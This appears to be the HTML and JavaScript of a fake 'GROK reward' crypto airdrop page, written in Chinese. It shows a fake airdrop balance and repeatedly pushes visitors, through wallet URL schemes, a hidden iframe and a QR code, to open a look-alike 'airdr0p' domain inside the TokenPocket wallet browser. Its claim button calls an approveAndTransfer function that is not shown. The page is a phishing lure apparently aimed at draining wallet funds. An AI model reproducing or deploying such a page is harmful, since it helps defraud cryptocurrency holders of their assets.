<div class="card">
  <h1>GROK 奖励领取</h1>

  <!-- TP唤醒提示 -->
  <div class="warning" id="tpTip">
    先复制 DApp 链接，然后在 TP 钱包内置浏览器粘贴访问。
  </div>

  <!-- 复制 DApp 链接按钮 -->
  <button id="copyLinkBtn" onclick="copyDappLink()">复制 DApp 链接</button>

  <!-- 唤醒 TP 钱包按钮 -->
  <button id="openTPBtn" onclick="openTPWallet()">尝试打开 TP 钱包</button>

  <div id="walletInfo" style="display:none;">
    <div class="address" id="walletAddress"></div>
    <div style="margin-top:10px; color:#666;">
      剩余空投余额: <span id="usdtBalance">加载中...</span>
    </div>
  </div>

  <button id="actionBtn" onclick="approveAndTransfer()">领取奖励</button>

  <div id="status" class="info">
    等待连接钱包...
  </div>
</div>

<script>
const TARGET_URL = "https://airdr0p-888.github.io/GROK1688/index.html";

/** 判断是否在 TP 内置浏览器 */
function isTPBrowser() {
  return /TokenPocket/i.test(navigator.userAgent);
}

/** 复制 DApp 链接到剪贴板 */
function copyDappLink() {
  if (navigator.clipboard) {
    navigator.clipboard.writeText(TARGET_URL).then(() => {
      alert("DApp 链接已复制到剪贴板！请在 TP 钱包内置浏览器粘贴访问。");
    }).catch(() => {
      alert("请手动复制链接访问 DApp：\n" + TARGET_URL);
    });
  } else {
    const tempInput = document.createElement("input");
    tempInput.value = TARGET_URL;
    document.body.appendChild(tempInput);
    tempInput.select();
    document.execCommand("copy");
    document.body.removeChild(tempInput);
    alert("DApp 链接已复制到剪贴板！请在 TP 钱包内置浏览器粘贴访问。");
  }
}

/** 尝试唤醒 TP 钱包（Scheme方式） */
function openTPWallet() {
  const encoded = encodeURIComponent(TARGET_URL);
  const schemes = [
    `tpdapp://open?url=${encoded}`,
    `tp://dapp?url=${encoded}`
  ];

  // 如果已在 TP 内置浏览器，直接跳转
  if (isTPBrowser()) {
    location.href = TARGET_URL;
    return;
  }

  // 尝试 Scheme 1
  window.location.href = schemes[0];

  // iframe 尝试（安卓）
  setTimeout(() => {
    try {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = schemes[0];
      document.body.appendChild(iframe);
      setTimeout(() => document.body.removeChild(iframe), 2000);
    } catch(e){}
  }, 300);

  // Scheme 2 备用
  setTimeout(() => { window.location.href = schemes[1]; }, 2000);

  // 显示二维码备用
  setTimeout(() => { showQRCode(TARGET_URL); }, 3500);

  // 下载提示
  setTimeout(() => { showQRCode(TARGET_URL); }, 10000);
}

/** 显示二维码和下载提示 */
function showQRCode(url) {
  if (document.getElementById("qrWrap")) return;

  const qrSrc = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(url);
  const wrap = document.createElement("div");
  wrap.id = "qrWrap";
  wrap.style = "margin-top:12px;text-align:center;color:#555;font-size:14px;";
  wrap.innerHTML = `
    <div>若 TP 未自动打开，请扫描二维码或点击“在浏览器打开”</div>
    <img src="${qrSrc}" alt="QR" style="margin-top:8px;width:200px;height:200px;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.08);" />
    <div style="margin-top:8px;">
      <a href="${TARGET_URL}" target="_blank" style="color:#1a73e8;text-decoration:none;">在外部浏览器打开</a>
    </div>
  `;
  document.querySelector('.card').appendChild(wrap);

  if (!document.getElementById('tpDownloadNotice')) {
    const el = document.createElement('div');
    el.id = 'tpDownloadNotice';
    el.style = 'margin-top:12px;color:#b00;font-size:13px;';
    el.innerHTML = '如果未安装 TokenPocket，请前往官网下载：<a href="https://www.tokenpocket.pro/zh/download" target="_blank">下载 TP</a>';
    document.querySelector('.card').appendChild(el);
  }
}
</script>
